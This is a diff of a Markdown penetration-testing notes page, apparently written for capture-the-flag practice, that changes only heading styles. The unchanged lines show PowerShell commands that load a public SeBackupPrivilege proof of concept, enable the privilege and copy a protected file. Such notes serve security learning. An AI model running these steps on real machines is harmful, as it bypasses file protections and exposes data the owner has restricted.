@@ -6,21 +6,21 @@
 
 We can use this PoC [**\[LINK\]**](https://github.com/giuliano108/SeBackupPrivilege) to exploit the <mark style="color:green;">`SeBackupPrivilege`</mark>, and copy forbidden files.
 
-## <mark style="color:yellow;">Importing Required Libraries</mark>
+#### Importing Required Libraries
 
 ```powershell
 PS C:\> Import-Module .\SeBackupPrivilegeUtils.dll
 PS C:\> Import-Module .\SeBackupPrivilegeCmdLets.dll
 ```
 
-## <mark style="color:yellow;">Enabling</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`SeBackupPrivilege`</mark>
+#### Enabling `SeBackupPrivilege`
 
 <pre class="language-powershell"><code class="lang-powershell"><strong>PS C:\> Set-SeBackupPrivilege
 </strong>PS C:\> whoami /priv # verifying
 PS C:\> Get-SeBackupPrivilege # verifying
 </code></pre>
 
-## <mark style="color:yellow;">Copying a Protected File</mark>
+#### Copying a Protected File
 
 ```powershell
 PS C:\> Copy-FileSeBackupPrivilege 'C:\Users\venator17\flag.txt' .\flag.txt
